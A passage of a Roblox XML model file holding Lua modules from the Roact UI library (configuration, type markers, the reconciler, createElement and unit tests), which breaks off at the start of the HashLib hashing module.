-- Every valid configuration value should be non-nil in this table.
local defaultConfig = {
	-- Enables asserts for internal Roact APIs. Useful for debugging Roact itself.
	["internalTypeChecks"] = false,
	-- Enables stricter type asserts for Roact's public API.
	["typeChecks"] = false,
	-- Enables storage of `debug.traceback()` values on elements for debugging.
	["elementTracing"] = false,
	-- Enables validation of component props in stateful components.
	["propValidation"] = false,
}

-- Build a list of valid configuration values up for debug messages.
local defaultConfigKeys = {}
for key in pairs(defaultConfig) do
	table.insert(defaultConfigKeys, key)
end

local Config = {}

function Config.new()
	local self = {}

	self._currentConfig = setmetatable({}, {
		__index = function(_, key)
			local message = (
				"Invalid global configuration key %q. Valid configuration keys are: %s"
			):format(
				tostring(key),
				table.concat(defaultConfigKeys, ", ")
			)

			error(message, 3)
		end
	})

	-- We manually bind these methods here so that the Config's methods can be
	-- used without passing in self, since they eventually get exposed on the
	-- root Roact object.
	self.set = function(...)
		return Config.set(self, ...)
	end

	self.get = function(...)
		return Config.get(self, ...)
	end

	self.scoped = function(...)
		return Config.scoped(self, ...)
	end

	self.set(defaultConfig)

	return self
end

function Config:set(configValues)
	-- Validate values without changing any configuration.
	-- We only want to apply this configuration if it's valid!
	for key, value in pairs(configValues) do
		if defaultConfig[key] == nil then
			local message = (
				"Invalid global configuration key %q (type %s). Valid configuration keys are: %s"
			):format(
				tostring(key),
				typeof(key),
				table.concat(defaultConfigKeys, ", ")
			)

			error(message, 3)
		end

		-- Right now, all configuration values must be boolean.
		if typeof(value) ~= "boolean" then
			local message = (
				"Invalid value %q (type %s) for global configuration key %q. Valid values are: true, false"
			):format(
				tostring(value),
				typeof(value),
				tostring(key)
			)

			error(message, 3)
		end

		self._currentConfig[key] = value
	end
end

function Config:get()
	return self._currentConfig
end

function Config:scoped(configValues, callback)
	local previousValues = {}
	for key, value in pairs(self._currentConfig) do
		previousValues[key] = value
	end

	self.set(configValues)

	local success, result = pcall(callback)

	self.set(previousValues)

	assert(success, result)
end

return Config]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX4325410A88BF476C85ABB958D7CDF72A">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Type</string>
					<string name="ScriptGuid">{2274C342-A1DA-4788-BAE3-224BB3BF4B50}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Contains markers for annotating objects with types.

	To set the type of an object, use `Type` as a key and the actual marker as
	the value:

		local foo = {
			[Type] = Type.Foo,
		}
]]

local Symbol = require(script.Parent.Symbol)
local strict = require(script.Parent.strict)

local Type = newproxy(true)

local TypeInternal = {}

local function addType(name)
	TypeInternal[name] = Symbol.named("Roact" .. name)
end

addType("Binding")
addType("Element")
addType("HostChangeEvent")
addType("HostEvent")
addType("StatefulComponentClass")
addType("StatefulComponentInstance")
addType("VirtualNode")
addType("VirtualTree")

function TypeInternal.of(value)
	if typeof(value) ~= "table" then
		return nil
	end

	return value[Type]
end

getmetatable(Type).__index = TypeInternal

getmetatable(Type).__tostring = function()
	return "RoactType"
end

strict(TypeInternal, "Type")

return Type]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXD1A938FAF7564B858BD396B07901F074">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createSignal.spec</string>
					<string name="ScriptGuid">{2F98800F-62BC-4C68-8B3F-9FEB8A059885}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local createSignal = require(script.Parent.createSignal)

	local createSpy = require(script.Parent.createSpy)

	it("should fire subscribers and disconnect them", function()
		local signal = createSignal()

		local spy = createSpy()
		local disconnect = signal:subscribe(spy.value)

		expect(spy.callCount).to.equal(0)

		local a = 1
		local b = {}
		local c = "hello"
		signal:fire(a, b, c)

		expect(spy.callCount).to.equal(1)
		spy:assertCalledWith(a, b, c)

		disconnect()

		signal:fire()

		expect(spy.callCount).to.equal(1)
	end)

	it("should handle multiple subscribers", function()
		local signal = createSignal()

		local spyA = createSpy()
		local spyB = createSpy()

		local disconnectA = signal:subscribe(spyA.value)
		local disconnectB = signal:subscribe(spyB.value)

		expect(spyA.callCount).to.equal(0)
		expect(spyB.callCount).to.equal(0)

		local a = {}
		local b = 67
		signal:fire(a, b)

		expect(spyA.callCount).to.equal(1)
		spyA:assertCalledWith(a, b)

		expect(spyB.callCount).to.equal(1)
		spyB:assertCalledWith(a, b)

		disconnectA()

		signal:fire(b, a)

		expect(spyA.callCount).to.equal(1)

		expect(spyB.callCount).to.equal(2)
		spyB:assertCalledWith(b, a)

		disconnectB()
	end)

	it("should stop firing a connection if disconnected mid-fire", function()
		local signal = createSignal()

		-- In this test, we'll connect two listeners that each try to disconnect
		-- the other. Because the order of listeners firing isn't defined, we
		-- have to be careful to handle either case.

		local disconnectA
		local disconnectB

		local spyA = createSpy(function()
			disconnectB()
		end)

		local spyB = createSpy(function()
			disconnectA()
		end)

		disconnectA = signal:subscribe(spyA.value)
		disconnectB = signal:subscribe(spyB.value)

		signal:fire()

		-- Exactly once listener should have been called.
		expect(spyA.callCount + spyB.callCount).to.equal(1)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXB2C136CA76CB4E2796719A94AD67252A">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createSpy</string>
					<string name="ScriptGuid">{A1168D9C-CC1D-441D-872B-0109251496BC}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A utility used to create a function spy that can be used to robustly test
	that functions are invoked the correct number of times and with the correct
	number of arguments.

	This should only be used in tests.
]]

local assertDeepEqual = require(script.Parent.assertDeepEqual)

local function createSpy(inner)
	local self = {
		callCount = 0,
		values = {},
		valuesLength = 0,
	}

	self.value = function(...)
		self.callCount = self.callCount + 1
		self.values = {...}
		self.valuesLength = select("#", ...)

		if inner ~= nil then
			return inner(...)
		end
	end

	self.assertCalledWith = function(_, ...)
		local len = select("#", ...)

		if self.valuesLength ~= len then
			error(("Expected %d arguments, but was called with %d arguments"):format(
				self.valuesLength,
				len
			), 2)
		end

		for i = 1, len do
			local expected = select(i, ...)

			assert(self.values[i] == expected, "value differs")
		end
	end

	self.assertCalledWithDeepEqual = function(_, ...)
		local len = select("#", ...)

		if self.valuesLength ~= len then
			error(("Expected %d arguments, but was called with %d arguments"):format(
				self.valuesLength,
				len
			), 2)
		end

		for i = 1, len do
			local expected = select(i, ...)

			assertDeepEqual(self.values[i], expected)
		end
	end

	self.captureValues = function(_, ...)
		local len = select("#", ...)
		local result = {}

		assert(self.valuesLength == len, "length of expected values differs from stored values")

		for i = 1, len do
			local key = select(i, ...)
			result[key] = self.values[i]
		end

		return result
	end

	setmetatable(self, {
		__index = function(_, key)
			error(("%q is not a valid member of spy"):format(key))
		end,
	})

	return self
end

return createSpy]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXC04B7E5BD28B48039B718FD6F0922578">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Symbol.spec</string>
					<string name="ScriptGuid">{65859B51-C211-4318-9DCB-28D942CDB9A9}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Symbol = require(script.Parent.Symbol)

	describe("named", function()
		it("should give an opaque object", function()
			local symbol = Symbol.named("foo")

			expect(symbol).to.be.a("userdata")
		end)

		it("should coerce to the given name", function()
			local symbol = Symbol.named("foo")

			expect(tostring(symbol):find("foo")).to.be.ok()
		end)

		it("should be unique when constructed", function()
			local symbolA = Symbol.named("abc")
			local symbolB = Symbol.named("abc")

			expect(symbolA).never.to.equal(symbolB)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX2E0ED8F0A84543E495F6D7D997268AAE">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ElementKind.spec</string>
					<string name="ScriptGuid">{C60BC8BF-AEB6-4583-9C23-E05A1B03D1C6}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Portal = require(script.Parent.Portal)
	local Component = require(script.Parent.Component)

	local ElementKind = require(script.Parent.ElementKind)

	describe("of", function()
		it("should return nil for non-table values", function()
			expect(ElementKind.of(nil)).to.equal(nil)
			expect(ElementKind.of(5)).to.equal(nil)
			expect(ElementKind.of(newproxy(true))).to.equal(nil)
		end)

		it("should return nil for table values without an ElementKind key", function()
			expect(ElementKind.of({})).to.equal(nil)
		end)

		it("should return the ElementKind from a table", function()
			local value = {
				[ElementKind] = ElementKind.Stateful,
			}

			expect(ElementKind.of(value)).to.equal(ElementKind.Stateful)
		end)
	end)

	describe("fromComponent", function()
		it("should handle host components", function()
			expect(ElementKind.fromComponent("foo")).to.equal(ElementKind.Host)
		end)

		it("should handle function components", function()
			local function foo()
			end

			expect(ElementKind.fromComponent(foo)).to.equal(ElementKind.Function)
		end)

		it("should handle stateful components", function()
			local Foo = Component:extend("Foo")

			expect(ElementKind.fromComponent(Foo)).to.equal(ElementKind.Stateful)
		end)

		it("should handle portals", function()
			expect(ElementKind.fromComponent(Portal)).to.equal(ElementKind.Portal)
		end)

		it("should return nil for invalid inputs", function()
			expect(ElementKind.fromComponent(5)).to.equal(nil)
			expect(ElementKind.fromComponent(newproxy(true))).to.equal(nil)
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX923B413824464EF6890E9055E9A0EF4B">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createReconciler</string>
					<string name="ScriptGuid">{9D4B768E-1DE5-4A06-8304-ED7DFBD53247}</string>
					<ProtectedString name="Source"><![CDATA[local Type = require(script.Parent.Type)
local ElementKind = require(script.Parent.ElementKind)
local ElementUtils = require(script.Parent.ElementUtils)
local Children = require(script.Parent.PropMarkers.Children)
local Symbol = require(script.Parent.Symbol)
local internalAssert = require(script.Parent.internalAssert)

local config = require(script.Parent.GlobalConfig).get()

local InternalData = Symbol.named("InternalData")

--[[
	The reconciler is the mechanism in Roact that constructs the virtual tree
	that later gets turned into concrete objects by the renderer.

	Roact's reconciler is constructed with the renderer as an argument, which
	enables switching to different renderers for different platforms or
	scenarios.

	When testing the reconciler itself, it's common to use `NoopRenderer` with
	spies replacing some methods. The default (and only) reconciler interface
	exposed by Roact right now uses `RobloxRenderer`.
]]
local function createReconciler(renderer)
	local reconciler
	local mountVirtualNode
	local updateVirtualNode
	local unmountVirtualNode

	--[[
		Unmount the given virtualNode, replacing it with a new node described by
		the given element.

		Preserves host properties, depth, and legacyContext from parent.
	]]
	local function replaceVirtualNode(virtualNode, newElement)
		local hostParent = virtualNode.hostParent
		local hostKey = virtualNode.hostKey
		local depth = virtualNode.depth

		-- If the node that is being replaced has modified context, we need to
		-- use the original *unmodified* context for the new node
		-- The `originalContext` field will be nil if the context was unchanged
		local context = virtualNode.originalContext or virtualNode.context
		local parentLegacyContext = virtualNode.parentLegacyContext

		unmountVirtualNode(virtualNode)
		local newNode = mountVirtualNode(newElement, hostParent, hostKey, context, parentLegacyContext)

		-- mountVirtualNode can return nil if the element is a boolean
		if newNode ~= nil then
			newNode.depth = depth
		end

		return newNode
	end

	--[[
		Utility to update the children of a virtual node based on zero or more
		updated children given as elements.
	]]
	local function updateChildren(virtualNode, hostParent, newChildElements)
		if config.internalTypeChecks then
			internalAssert(Type.of(virtualNode) == Type.VirtualNode, "Expected arg #1 to be of type VirtualNode")
		end

		local removeKeys = {}

		-- Changed or removed children
		for childKey, childNode in pairs(virtualNode.children) do
			local newElement = ElementUtils.getElementByKey(newChildElements, childKey)
			local newNode = updateVirtualNode(childNode, newElement)

			if newNode ~= nil then
				virtualNode.children[childKey] = newNode
			else
				removeKeys[childKey] = true
			end
		end

		for childKey in pairs(removeKeys) do
			virtualNode.children[childKey] = nil
		end

		-- Added children
		for childKey, newElement in ElementUtils.iterateElements(newChildElements) do
			local concreteKey = childKey
			if childKey == ElementUtils.UseParentKey then
				concreteKey = virtualNode.hostKey
			end

			if virtualNode.children[childKey] == nil then
				local childNode = mountVirtualNode(
					newElement,
					hostParent,
					concreteKey,
					virtualNode.context,
					virtualNode.legacyContext
				)

				-- mountVirtualNode can return nil if the element is a boolean
				if childNode ~= nil then
					childNode.depth = virtualNode.depth + 1
					virtualNode.children[childKey] = childNode
				end
			end
		end
	end

	local function updateVirtualNodeWithChildren(virtualNode, hostParent, newChildElements)
		updateChildren(virtualNode, hostParent, newChildElements)
	end

	local function updateVirtualNodeWithRenderResult(virtualNode, hostParent, renderResult)
		if Type.of(renderResult) == Type.Element
			or renderResult == nil
			or typeof(renderResult) == "boolean"
		then
			updateChildren(virtualNode, hostParent, renderResult)
		else
			error(("%s\n%s"):format(
				"Component returned invalid children:",
				virtualNode.currentElement.source or "<enable element tracebacks>"
			), 0)
		end
	end

	--[[
		Unmounts the given virtual node and releases any held resources.
	]]
	function unmountVirtualNode(virtualNode)
		if config.internalTypeChecks then
			internalAssert(Type.of(virtualNode) == Type.VirtualNode, "Expected arg #1 to be of type VirtualNode")
		end

		local kind = ElementKind.of(virtualNode.currentElement)

		if kind == ElementKind.Host then
			renderer.unmountHostNode(reconciler, virtualNode)
		elseif kind == ElementKind.Function then
			for _, childNode in pairs(virtualNode.children) do
				unmountVirtualNode(childNode)
			end
		elseif kind == ElementKind.Stateful then
			virtualNode.instance:__unmount()
		elseif kind == ElementKind.Portal then
			for _, childNode in pairs(virtualNode.children) do
				unmountVirtualNode(childNode)
			end
		elseif kind == ElementKind.Fragment then
			for _, childNode in pairs(virtualNode.children) do
				unmountVirtualNode(childNode)
			end
		else
			error(("Unknown ElementKind %q"):format(tostring(kind), 2))
		end
	end

	local function updateFunctionVirtualNode(virtualNode, newElement)
		local children = newElement.component(newElement.props)

		updateVirtualNodeWithRenderResult(virtualNode, virtualNode.hostParent, children)

		return virtualNode
	end

	local function updatePortalVirtualNode(virtualNode, newElement)
		local oldElement = virtualNode.currentElement
		local oldTargetHostParent = oldElement.props.target

		local targetHostParent = newElement.props.target

		assert(renderer.isHostObject(targetHostParent), "Expected target to be host object")

		if targetHostParent ~= oldTargetHostParent then
			return replaceVirtualNode(virtualNode, newElement)
		end

		local children = newElement.props[Children]

		updateVirtualNodeWithChildren(virtualNode, targetHostParent, children)

		return virtualNode
	end

	local function updateFragmentVirtualNode(virtualNode, newElement)
		updateVirtualNodeWithChildren(virtualNode, virtualNode.hostParent, newElement.elements)

		return virtualNode
	end

	--[[
		Update the given virtual node using a new element describing what it
		should transform into.

		`updateVirtualNode` will return a new virtual node that should replace
		the passed in virtual node. This is because a virtual node can be
		updated with an element referencing a different component!

		In that case, `updateVirtualNode` will unmount the input virtual node,
		mount a new virtual node, and return it in this case, while also issuing
		a warning to the user.
	]]
	function updateVirtualNode(virtualNode, newElement, newState)
		if config.internalTypeChecks then
			internalAssert(Type.of(virtualNode) == Type.VirtualNode, "Expected arg #1 to be of type VirtualNode")
		end
		if config.typeChecks then
			assert(
				Type.of(newElement) == Type.Element or typeof(newElement) == "boolean" or newElement == nil,
				"Expected arg #2 to be of type Element, boolean, or nil"
			)
		end

		-- If nothing changed, we can skip this update
		if virtualNode.currentElement == newElement and newState == nil then
			return virtualNode
		end

		if typeof(newElement) == "boolean" or newElement == nil then
			unmountVirtualNode(virtualNode)
			return nil
		end

		if virtualNode.currentElement.component ~= newElement.component then
			return replaceVirtualNode(virtualNode, newElement)
		end

		local kind = ElementKind.of(newElement)

		local shouldContinueUpdate = true

		if kind == ElementKind.Host then
			virtualNode = renderer.updateHostNode(reconciler, virtualNode, newElement)
		elseif kind == ElementKind.Function then
			virtualNode = updateFunctionVirtualNode(virtualNode, newElement)
		elseif kind == ElementKind.Stateful then
			shouldContinueUpdate = virtualNode.instance:__update(newElement, newState)
		elseif kind == ElementKind.Portal then
			virtualNode = updatePortalVirtualNode(virtualNode, newElement)
		elseif kind == ElementKind.Fragment then
			virtualNode = updateFragmentVirtualNode(virtualNode, newElement)
		else
			error(("Unknown ElementKind %q"):format(tostring(kind), 2))
		end

		-- Stateful components can abort updates via shouldUpdate. If that
		-- happens, we should stop doing stuff at this point.
		if not shouldContinueUpdate then
			return virtualNode
		end

		virtualNode.currentElement = newElement

		return virtualNode
	end

	--[[
		Constructs a new virtual node but not does mount it.
	]]
	local function createVirtualNode(element, hostParent, hostKey, context, legacyContext)
		if config.internalTypeChecks then
			internalAssert(renderer.isHostObject(hostParent) or hostParent == nil, "Expected arg #2 to be a host object")
			internalAssert(typeof(context) == "table" or context == nil, "Expected arg #4 to be of type table or nil")
			internalAssert(
				typeof(legacyContext) == "table" or legacyContext == nil,
				"Expected arg #5 to be of type table or nil"
			)
		end
		if config.typeChecks then
			assert(hostKey ~= nil, "Expected arg #3 to be non-nil")
			assert(
				Type.of(element) == Type.Element or typeof(element) == "boolean",
				"Expected arg #1 to be of type Element or boolean"
			)
		end

		return {
			[Type] = Type.VirtualNode,
			currentElement = element,
			depth = 1,
			children = {},
			hostParent = hostParent,
			hostKey = hostKey,

			-- Legacy Context API
			-- A table of context values inherited from the parent node
			legacyContext = legacyContext,

			-- A saved copy of the parent context, used when replacing a node
			parentLegacyContext = legacyContext,

			-- Context API
			-- A table of context values inherited from the parent node
			context = context or {},

			-- A saved copy of the unmodified context; this will be updated when
			-- a component adds new context and used when a node is replaced
			originalContext = nil,
		}
	end

	local function mountFunctionVirtualNode(virtualNode)
		local element = virtualNode.currentElement

		local children = element.component(element.props)

		updateVirtualNodeWithRenderResult(virtualNode, virtualNode.hostParent, children)
	end

	local function mountPortalVirtualNode(virtualNode)
		local element = virtualNode.currentElement

		local targetHostParent = element.props.target
		local children = element.props[Children]

		assert(renderer.isHostObject(targetHostParent), "Expected target to be host object")

		updateVirtualNodeWithChildren(virtualNode, targetHostParent, children)
	end

	local function mountFragmentVirtualNode(virtualNode)
		local element = virtualNode.currentElement
		local children = element.elements

		updateVirtualNodeWithChildren(virtualNode, virtualNode.hostParent, children)
	end

	--[[
		Constructs a new virtual node and mounts it, but does not place it into
		the tree.
	]]
	function mountVirtualNode(element, hostParent, hostKey, context, legacyContext)
		if config.internalTypeChecks then
			internalAssert(renderer.isHostObject(hostParent) or hostParent == nil, "Expected arg #2 to be a host object")
			internalAssert(
				typeof(legacyContext) == "table" or legacyContext == nil,
				"Expected arg #5 to be of type table or nil"
			)
		end
		if config.typeChecks then
			assert(hostKey ~= nil, "Expected arg #3 to be non-nil")
			assert(
				Type.of(element) == Type.Element or typeof(element) == "boolean",
				"Expected arg #1 to be of type Element or boolean"
			)
		end

		-- Boolean values render as nil to enable terse conditional rendering.
		if typeof(element) == "boolean" then
			return nil
		end

		local kind = ElementKind.of(element)

		local virtualNode = createVirtualNode(element, hostParent, hostKey, context, legacyContext)

		if kind == ElementKind.Host then
			renderer.mountHostNode(reconciler, virtualNode)
		elseif kind == ElementKind.Function then
			mountFunctionVirtualNode(virtualNode)
		elseif kind == ElementKind.Stateful then
			element.component:__mount(reconciler, virtualNode)
		elseif kind == ElementKind.Portal then
			mountPortalVirtualNode(virtualNode)
		elseif kind == ElementKind.Fragment then
			mountFragmentVirtualNode(virtualNode)
		else
			error(("Unknown ElementKind %q"):format(tostring(kind), 2))
		end

		return virtualNode
	end

	--[[
		Constructs a new Roact virtual tree, constructs a root node for
		it, and mounts it.
	]]
	local function mountVirtualTree(element, hostParent, hostKey)
		if config.typeChecks then
			assert(Type.of(element) == Type.Element, "Expected arg #1 to be of type Element")
			assert(renderer.isHostObject(hostParent) or hostParent == nil, "Expected arg #2 to be a host object")
		end

		if hostKey == nil then
			hostKey = "RoactTree"
		end

		local tree = {
			[Type] = Type.VirtualTree,
			[InternalData] = {
				-- The root node of the tree, which starts into the hierarchy of
				-- Roact component instances.
				rootNode = nil,
				mounted = true,
			},
		}

		tree[InternalData].rootNode = mountVirtualNode(element, hostParent, hostKey)

		return tree
	end

	--[[
		Unmounts the virtual tree, freeing all of its resources.

		No further operations should be done on the tree after it's been
		unmounted, as indicated by its the `mounted` field.
	]]
	local function unmountVirtualTree(tree)
		local internalData = tree[InternalData]
		if config.typeChecks then
			assert(Type.of(tree) == Type.VirtualTree, "Expected arg #1 to be a Roact handle")
			assert(internalData.mounted, "Cannot unmounted a Roact tree that has already been unmounted")
		end

		internalData.mounted = false

		if internalData.rootNode ~= nil then
			unmountVirtualNode(internalData.rootNode)
		end
	end

	--[[
		Utility method for updating the root node of a virtual tree given a new
		element.
	]]
	local function updateVirtualTree(tree, newElement)
		local internalData = tree[InternalData]
		if config.typeChecks then
			assert(Type.of(tree) == Type.VirtualTree, "Expected arg #1 to be a Roact handle")
			assert(Type.of(newElement) == Type.Element, "Expected arg #2 to be a Roact Element")
		end

		internalData.rootNode = updateVirtualNode(internalData.rootNode, newElement)

		return tree
	end

	reconciler = {
		mountVirtualTree = mountVirtualTree,
		unmountVirtualTree = unmountVirtualTree,
		updateVirtualTree = updateVirtualTree,

		createVirtualNode = createVirtualNode,
		mountVirtualNode = mountVirtualNode,
		unmountVirtualNode = unmountVirtualNode,
		updateVirtualNode = updateVirtualNode,
		updateVirtualNodeWithChildren = updateVirtualNodeWithChildren,
		updateVirtualNodeWithRenderResult = updateVirtualNodeWithRenderResult,
	}

	return reconciler
end

return createReconciler
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX710ABEF5DD8F4434A72FF1B0A0EBB622">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createElement</string>
					<string name="ScriptGuid">{79E49592-7C5E-43F8-A391-D82FCE808655}</string>
					<ProtectedString name="Source"><![CDATA[local Children = require(script.Parent.PropMarkers.Children)
local ElementKind = require(script.Parent.ElementKind)
local Logging = require(script.Parent.Logging)
local Type = require(script.Parent.Type)

local config = require(script.Parent.GlobalConfig).get()

local multipleChildrenMessage = [[
The prop `Roact.Children` was defined but was overriden by the third parameter to createElement!
This can happen when a component passes props through to a child element but also uses the `children` argument:

	Roact.createElement("Frame", passedProps, {
		child = ...
	})

Instead, consider using a utility function to merge tables of children together:

	local children = mergeTables(passedProps[Roact.Children], {
		child = ...
	})

	local fullProps = mergeTables(passedProps, {
		[Roact.Children] = children
	})

	Roact.createElement("Frame", fullProps)]]

--[[
	Creates a new element representing the given component.

	Elements are lightweight representations of what a component instance should
	look like.

	Children is a shorthand for specifying `Roact.Children` as a key inside
	props. If specified, the passed `props` table is mutated!
]]
local function createElement(component, props, children)
	if config.typeChecks then
		assert(component ~= nil, "`component` is required")
		assert(typeof(props) == "table" or props == nil, "`props` must be a table or nil")
		assert(typeof(children) == "table" or children == nil, "`children` must be a table or nil")
	end

	if props == nil then
		props = {}
	end

	if children ~= nil then
		if props[Children] ~= nil then
			Logging.warnOnce(multipleChildrenMessage)
		end

		props[Children] = children
	end

	local elementKind = ElementKind.fromComponent(component)

	local element = {
		[Type] = Type.Element,
		[ElementKind] = elementKind,
		component = component,
		props = props,
	}

	if config.elementTracing then
		-- We trim out the leading newline since there's no way to specify the
		-- trace level without also specifying a message.
		element.source = debug.traceback("", 2):sub(2)
	end

	return element
end

return createElement]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
		</Item>
		<Item class="ModuleScript" referent="RBX55733A7F27D944489B0073BAC4DB2917">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">HashLib</string>
				<string name="ScriptGuid">{3367B8F5-68E3-49CE-9225-993D5AB4A7D2}</string>
				<ProtectedString name="Source"><![CDATA[--[=[------------------------------------------------------------------------------------------------------------------------
-- HashLib by Egor Skriptunoff, boatbomber, and howmanysmall

Documentation here: https://devforum.roblox.com/t/open-source-hashlib/416732/1

--------------------------------------------------------------------------------------------------------------------------

Module was originally written by Egor Skriptunoff and distributed under an MIT license.
It can be found here: https://github.com/Egor-Skriptunoff/pure_lua_SHA/blob/master/sha2.lua

That version was around 3000 lines long, and supported Lua versions 5.1, 5.2, 5.3, and 5.4, and LuaJIT.
Although that is super cool, Roblox only uses Lua 5.1, so that was extreme overkill.

I, boatbomber, worked to port it to Roblox in a way that doesn't overcomplicate it with support of unreachable
cases. Then, howmanysmall did some final optimizations that really squeeze out all the performance possible.
It's gotten stupid fast, thanks to her!

After quite a bit of work and benchmarking, this is what we were left with.
Enjoy!

--------------------------------------------------------------------------------------------------------------------------

DESCRIPTION:
	This module contains functions to calculate SHA digest:
		MD5, SHA-1,
		SHA-224, SHA-256, SHA-512/224, SHA-512/256, SHA-384, SHA-512,
		SHA3-224, SHA3-256, SHA3-384, SHA3-512, SHAKE128, SHAKE256,
		HMAC
	Additionally, it has a few extra utility functions:
		hex_to_bin
		base64_to_bin
		bin_to_base64
	Written in pure Lua.
USAGE:
	Input data should be a string
	Result (SHA digest) is returned in hexadecimal representation as a string of lowercase hex digits.
	Simplest usage example:
		local HashLib = require(script.HashLib)
		local your_hash = HashLib.sha256("your string")
API:
		HashLib.md5
		HashLib.sha1
	SHA2 hash functions:
		HashLib.sha224
		HashLib.sha256
		HashLib.sha512_224
		HashLib.sha512_256
		HashLib.sha384
		HashLib.sha512
	SHA3 hash functions:
		HashLib.sha3_224
		HashLib.sha3_256
		HashLib.sha3_384
		HashLib.sha3_512
		HashLib.shake128
		HashLib.shake256
	Misc utilities:
		HashLib.hmac (Applicable to any hash function from this module except SHAKE*)
		HashLib.hex_to_bin
		HashLib.base64_to_bin
		HashLib.bin_to_base64

--]=]---------------------------------------------------------------------------

local Base64 = require(script.Base64)

--------------------------------------------------------------------------------
-- LOCALIZATION FOR VM OPTIMIZATIONS
--------------------------------------------------------------------------------

local ipairs = ipairs

--------------------------------------------------------------------------------
-- 32-BIT BITWISE FUNCTIONS
--------------------------------------------------------------------------------
-- Only low 32 bits of function arguments matter, high bits are ignored
-- The result of all functions (except HEX) is an integer inside "correct range":
-- for "bit" library:    (-TWO_POW_31)..(TWO_POW_31-1)
-- for "bit32" library:        0..(TWO_POW_32-1)
local bit32_band = bit32.band -- 2 arguments
local bit32_bor = bit32.bor -- 2 arguments
local bit32_bxor = bit32.bxor -- 2..5 arguments
local bit32_lshift = bit32.lshift -- second argument is integer 0..31
local bit32_rshift = bit32.rshift -- second argument is integer 0..31
local bit32_lrotate = bit32.lrotate -- second argument is integer 0..31
local bit32_rrotate = bit32.rrotate -- second argument is integer 0..31

--------------------------------------------------------------------------------
-- CREATING OPTIMIZED INNER LOOP
--------------------------------------------------------------------------------
-- Arrays of SHA2 "magic numbers" (in "INT64" and "FFI" branches "*_lo" arrays contain 64-bit values)
local sha2_K_lo, sha2_K_hi, sha2_H_lo, sha2_H_hi, sha3_RC_lo, sha3_RC_hi = {}, {}, {}, {}, {}, {}
local sha2_H_ext256 = {
	[224] = {};
	[256] = sha2_H_hi;
}

local sha2_H_ext512_lo, sha2_H_ext512_hi = {
	[384] = {};
	[512] = sha2_H_lo;
}, {
	[384] = {};
	[512] = sha2_H_hi;
}

local md5_K, md5_sha1_H = {}, {0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0}
local md5_next_shift = {0, 0, 0, 0, 0, 0, 0, 0, 28, 25, 26, 27, 0, 0, 10, 9, 11, 12, 0, 15, 16, 17, 18, 0, 20, 22, 23, 21}
local HEX64, XOR64A5, lanes_index_base -- defined only for branches that internally use 64-bit integers: "INT64" and "FFI"
local common_W = {} -- temporary table shared between all calculations (to avoid creating new temporary table every time)
local K_lo_modulo, hi_factor, hi_factor_keccak = 4294967296, 0, 0

local TWO_POW_NEG_56 = 2 ^ -56
local TWO_POW_NEG_17 = 2 ^ -17

local TWO_POW_2 = 2 ^ 2
local TWO_POW_3 = 2 ^ 3
local TWO_POW_4 = 2 ^ 4
local TWO_POW_5 = 2 ^ 5
local TWO_POW_6 = 2 ^ 6
local TWO_POW_7 = 2 ^ 7
local TWO_POW_8 = 2 ^ 8
local TWO_POW_9 = 2 ^ 9
local TWO_POW_10 = 2 ^ 10
local TWO_POW_11 = 2 ^ 11
local TWO_POW_12 = 2 ^ 12
local TWO_POW_13 = 2 ^ 13
local TWO_POW_14 = 2 ^ 14
local TWO_POW_15 = 2 ^ 15
local TWO_POW_16 = 2 ^ 16
local TWO_POW_17 = 2 ^ 17
local TWO_POW_18 = 2 ^ 18
local TWO_POW_19 = 2 ^ 19
local TWO_POW_20 = 2 ^ 20
local TWO_POW_21 = 2 ^ 21
local TWO_POW_22 = 2 ^ 22
local TWO_POW_23 = 2 ^ 23
local TWO_POW_24 = 2 ^ 24
local TWO_POW_25 = 2 ^ 25
local TWO_POW_26 = 2 ^ 26
local TWO_POW_27 = 2 ^ 27
local TWO_POW_28 = 2 ^ 28
local TWO_POW_29 = 2 ^ 29
local TWO_POW_30 = 2 ^ 30
